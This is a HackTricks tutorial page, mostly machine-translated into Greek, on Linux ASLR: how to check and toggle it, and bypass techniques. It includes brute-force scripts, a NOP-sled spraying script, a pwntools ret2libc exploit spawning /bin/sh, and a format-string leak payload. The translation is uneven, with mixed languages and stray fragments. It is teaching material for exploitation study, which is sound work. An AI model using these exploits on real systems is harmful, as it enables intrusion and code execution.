# ASLR

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**Η Τυχαία Διάταξη Χώρου Διευθύνσεων (ASLR)** είναι μια τεχνική ασφαλείας που χρησιμοποιείται σε λειτουργικά συστήματα για να **τυχαίνει τις διευθύνσεις μνήμης** που χρησιμοποιούνται από διαδικασίες συστήματος και εφαρμογών. Με αυτόν τον τρόπο, καθιστά σημαντικά πιο δύσκολο για έναν επιτιθέμενο να προβλέψει την τοποθεσία συγκεκριμένων διαδικασιών και δεδομένων, όπως η στοίβα, η σωρός και οι βιβλιοθήκες, μειώνοντας έτσι ορισμένους τύπους εκμεταλλεύσεων, ιδιαίτερα τις υπερχειλίσεις μνήμης.

### **Checking ASLR Status**

Για να **ελέγξετε** την κατάσταση ASLR σε ένα σύστημα Linux, μπορείτε να διαβάσετε την τιμή από το **`/proc/sys/kernel/randomize_va_space`** αρχείο. Η τιμή που αποθηκεύεται σε αυτό το αρχείο καθορίζει τον τύπο ASLR που εφαρμόζεται:

* **0**: Καμία τυχαία διάταξη. Όλα είναι στατικά.
* **1**: Συντηρητική τυχαία διάταξη. Οι κοινές βιβλιοθήκες, η στοίβα, το mmap(), η σελίδα VDSO είναι τυχαίες.
* **2**: Πλήρης τυχαία διάταξη. Εκτός από τα στοιχεία που τυχαίνουν από τη συντηρητική τυχαία διάταξη, η μνήμη που διαχειρίζεται μέσω του `brk()` είναι τυχαία.

Μπορείτε να ελέγξετε την κατάσταση ASLR με την παρακάτω εντολή:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Απενεργοποίηση ASLR**

Για να **απενεργοποιήσετε** το ASLR, ορίστε την τιμή του `/proc/sys/kernel/randomize_va_space` σε **0**. Η απενεργοποίηση του ASLR γενικά δεν συνιστάται εκτός από σενάρια δοκιμών ή αποσφαλμάτωσης. Ακολουθούν οι οδηγίες για να το απενεργοποιήσετε:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Μπορείτε επίσης να απενεργοποιήσετε το ASLR για μια εκτέλεση με:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Ενεργοποίηση ASLR**

Για να **ενεργοποιήσετε** το ASLR, μπορείτε να γράψετε μια τιμή **2** στο αρχείο `/proc/sys/kernel/randomize_va_space`. Αυτό συνήθως απαιτεί δικαιώματα root. Η πλήρης τυχαία κατανομή μπορεί να γίνει με την ακόλουθη εντολή:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Επιμονή Μεταξύ Επανεκκινήσεων**

Οι αλλαγές που γίνονται με τις εντολές `echo` είναι προσωρινές και θα επαναρυθμιστούν κατά την επανεκκίνηση. Για να κάνετε την αλλαγή μόνιμη, πρέπει να επεξεργαστείτε το αρχείο `/etc/sysctl.conf` και να προσθέσετε ή να τροποποιήσετε την παρακάτω γραμμή:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Μετά την επεξεργασία του `/etc/sysctl.conf`, εφαρμόστε τις αλλαγές με:
```bash
sudo sysctl -p
```
This will ensure that your ASLR settings remain across reboots.

## **Bypasses**

### 32bit brute-forcing

PaX divides the process address space into **3 groups**:

* **Κώδικας και δεδομένα** (αρχικοποιημένα και μη αρχικοποιημένα): `.text`, `.data`, και `.bss` —> **16 bits** of entropy in the `delta_exec` variable. This variable is randomly initialized with each process and added to the initial addresses.
* **Μνήμη** allocated by `mmap()` and **shared libraries** —> **16 bits**, named `delta_mmap`.
* **Η στοίβα** —> **24 bits**, referred to as `delta_stack`. However, it effectively uses **11 bits** (from the 10th to the 20th byte inclusive), aligned to **16 bytes** —> This results in **524,288 possible real stack addresses**.

The previous data is for 32-bit systems and the reduced final entropy makes possible to bypass ASLR by retrying the execution once and again until the exploit completes successfully.

#### Brute-force ideas:

* If you have a big enough overflow to host a **big NOP sled before the shellcode**, you could just brute-force addresses in the stack until the flow **jumps over some part of the NOP sled**.
* Another option for this in case the overflow is not that big and the exploit can be run locally is possible to **add the NOP sled and shellcode in an environment variable**.
* If the exploit is local, you can try to brute-force the base address of libc (useful for 32bit systems):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Αν επιτίθεστε σε έναν απομακρυσμένο διακομιστή, μπορείτε να προσπαθήσετε να **brute-force τη διεύθυνση της συνάρτησης `libc` `usleep`**, περνώντας ως επιχείρημα 10 (για παράδειγμα). Αν σε κάποιο σημείο ο **διακομιστής χρειαστεί 10 δευτερόλεπτα επιπλέον για να απαντήσει**, βρήκατε τη διεύθυνση αυτής της συνάρτησης.

{% hint style="success" %}
Σε συστήματα 64bit η εντροπία είναι πολύ υψηλότερη και αυτό δεν θα έπρεπε να είναι δυνατό.
{% endhint %}

### Brute-forcing στο stack 64 bits

Είναι δυνατόν να καταλάβετε ένα μεγάλο μέρος του stack με μεταβλητές περιβάλλοντος και στη συνέχεια να προσπαθήσετε να εκμεταλλευτείτε το δυαδικό εκατοντάδες/χίλιες φορές τοπικά.\
Ο παρακάτω κώδικας δείχνει πώς είναι δυνατόν να **επιλέξετε απλώς μια διεύθυνση στο stack** και κάθε **μερικές εκατοντάδες εκτελέσεις** αυτή η διεύθυνση θα περιέχει την **εντολή NOP**:
```c
//clang -o aslr-testing aslr-testing.c -fno-stack-protector -Wno-format-security -no-pie
#include <stdio.h>

int main() {
unsigned long long address = 0xffffff1e7e38;
unsigned int* ptr = (unsigned int*)address;
unsigned int value = *ptr;
printf("The 4 bytes from address 0xffffff1e7e38: 0x%x\n", value);
return 0;
}
```

```python
import subprocess
import traceback

# Start the process
nop = b"\xD5\x1F\x20\x03" # ARM64 NOP transposed
n_nops = int(128000/4)
shellcode_env_var = nop * n_nops

# Define the environment variables you want to set
env_vars = {
'a': shellcode_env_var,
'b': shellcode_env_var,
'c': shellcode_env_var,
'd': shellcode_env_var,
'e': shellcode_env_var,
'f': shellcode_env_var,
'g': shellcode_env_var,
'h': shellcode_env_var,
'i': shellcode_env_var,
'j': shellcode_env_var,
'k': shellcode_env_var,
'l': shellcode_env_var,
'm': shellcode_env_var,
'n': shellcode_env_var,
'o': shellcode_env_var,
'p': shellcode_env_var,
}

cont = 0
while True:
cont += 1

if cont % 10000 == 0:
break

print(cont, end="\r")
# Define the path to your binary
binary_path = './aslr-testing'

try:
process = subprocess.Popen(binary_path, env=env_vars, stdout=subprocess.PIPE, text=True)
output = process.communicate()[0]
if "0xd5" in str(output):
print(str(cont) + " -> " + output)
except Exception as e:
print(e)
print(traceback.format_exc())
pass
```
<figure><img src="../../../.gitbook/assets/image (1214).png" alt="" width="563"><figcaption></figcaption></figure>

### Τοπικές Πληροφορίες (`/proc/[pid]/stat`)

Το αρχείο **`/proc/[pid]/stat`** μιας διαδικασίας είναι πάντα αναγνώσιμο από όλους και **περιέχει ενδιαφέρουσες** πληροφορίες όπως:

* **startcode** & **endcode**: Διευθύνσεις πάνω και κάτω με το **TEXT** του δυαδικού
* **startstack**: Η διεύθυνση της αρχής της **στοίβας**
* **start\_data** & **end\_data**: Διευθύνσεις πάνω και κάτω όπου είναι το **BSS**
* **kstkesp** & **kstkeip**: Τρέχουσες διευθύνσεις **ESP** και **EIP**
* **arg\_start** & **arg\_end**: Διευθύνσεις πάνω και κάτω όπου είναι τα **cli arguments**.
* **env\_start** &**env\_end**: Διευθύνσεις πάνω και κάτω όπου είναι οι **env variables**.

Επομένως, αν ο επιτιθέμενος βρίσκεται στον ίδιο υπολογιστή με το δυαδικό που εκμεταλλεύεται και αυτό το δυαδικό δεν περιμένει την υπερχείλιση από ακατέργαστους παραμέτρους, αλλά από μια διαφορετική **είσοδο που μπορεί να κατασκευαστεί μετά την ανάγνωση αυτού του αρχείου**. Είναι δυνατόν για έναν επιτιθέμενο να **πάρε κάποια διευθύνσεις από αυτό το αρχείο και να κατασκευάσει offsets από αυτές για την εκμετάλλευση**.

{% hint style="success" %}
Για περισσότερες πληροφορίες σχετικά με αυτό το αρχείο, ελέγξτε [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) αναζητώντας το `/proc/pid/stat`
{% endhint %}

### Έχοντας μια διαρροή

* **Η πρόκληση είναι να δώσετε μια διαρροή**

Αν σας δοθεί μια διαρροή (εύκολες προκλήσεις CTF), μπορείτε να υπολογίσετε offsets από αυτήν (υποθέτοντας για παράδειγμα ότι γνωρίζετε την ακριβή έκδοση της libc που χρησιμοποιείται στο σύστημα που εκμεταλλεύεστε). Αυτό το παράδειγμα εκμετάλλευσης είναι αποσπασμένο από το [**παράδειγμα από εδώ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (ελέγξτε αυτή τη σελίδα για περισσότερες λεπτομέρειες):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

Καταχρώντας μια υπερχείλιση buffer, θα ήταν δυνατό να εκμεταλλευτεί κανείς ένα **ret2plt** για να εξάγει μια διεύθυνση μιας συνάρτησης από τη libc. Έλεγχος:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

Ακριβώς όπως στο ret2plt, αν έχετε μια αυθαίρετη ανάγνωση μέσω μιας ευπάθειας format strings, είναι δυνατό να εξάγετε τη διεύθυνση μιας **libc function** από το GOT. Το παρακάτω [**παράδειγμα είναι από εδώ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
You can find more info about Format Strings arbitrary read in:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

Δοκιμάστε να παρακάμψετε το ASLR εκμεταλλευόμενοι διευθύνσεις μέσα στη στοίβα:

{% content-ref url="ret2ret.md" %}
[ret2ret.md](ret2ret.md)
{% endcontent-ref %}

### vsyscall

Ο μηχανισμός **`vsyscall`** εξυπηρετεί στην ενίσχυση της απόδοσης επιτρέποντας σε ορισμένες κλήσεις συστήματος να εκτελούνται σε χώρο χρήστη, αν και είναι θεμελιωδώς μέρος του πυρήνα. Το κρίσιμο πλεονέκτημα των **vsyscalls** έγκειται στις **σταθερές διευθύνσεις** τους, οι οποίες δεν υπόκεινται σε **ASLR** (Τυχαία Διάταξη Χώρου Διευθύνσεων). Αυτή η σταθερή φύση σημαίνει ότι οι επιτιθέμενοι δεν απαιτούν μια ευπάθεια διαρροής πληροφοριών για να προσδιορίσουν τις διευθύνσεις τους και να τις χρησιμοποιήσουν σε μια εκμετάλλευση.\
Ωστόσο, δεν θα βρείτε εδώ πολύ ενδιαφέροντα gadgets (αν και για παράδειγμα είναι δυνατό να αποκτήσετε ένα ισοδύναμο `ret;`)

(Το παρακάτω παράδειγμα και ο κώδικας είναι [**από αυτή τη γραφή**](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html#exploitation))

Για παράδειγμα, ένας επιτιθέμενος μπορεί να χρησιμοποιήσει τη διεύθυνση `0xffffffffff600800` μέσα σε μια εκμετάλλευση. Ενώ η προσπάθεια άμεσης μετάβασης σε μια εντολή `ret` μπορεί να οδηγήσει σε αστάθεια ή κρα crashes μετά την εκτέλεση μερικών gadgets, η μετάβαση στην αρχή μιας `syscall` που παρέχεται από την ενότητα **vsyscall** μπορεί να αποδειχθεί επιτυχής. Τοποθετώντας προσεκτικά ένα gadget **ROP** που οδηγεί την εκτέλεση σε αυτή τη διεύθυνση **vsyscall**, ένας επιτιθέμενος μπορεί να επιτύχει εκτέλεση κώδικα χωρίς να χρειάζεται να παρακάμψει το **ASLR** για αυτό το μέρος της εκμετάλλευσης.
```
ef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  x.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
A syntax error in expression, near `.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]'.
gef➤  x/8g 0xffffffffff600000
0xffffffffff600000:    0xf00000060c0c748    0xccccccccccccc305
0xffffffffff600010:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600020:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600030:    0xcccccccccccccccc    0xcccccccccccccccc
gef➤  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
gef➤  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
```
### vDSO

Σημειώστε λοιπόν πώς μπορεί να είναι δυνατό να **παρακαμφθεί το ASLR εκμεταλλευόμενοι το vdso** αν ο πυρήνας έχει μεταγλωττιστεί με το CONFIG\_COMPAT\_VDSO, καθώς η διεύθυνση vdso δεν θα τυχαίνει τυχαίας κατανομής. Για περισσότερες πληροφορίες, ελέγξτε:

{% content-ref url="../../rop-return-oriented-programing/ret2vdso.md" %}
[ret2vdso.md](../../rop-return-oriented-programing/ret2vdso.md)
{% endcontent-ref %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
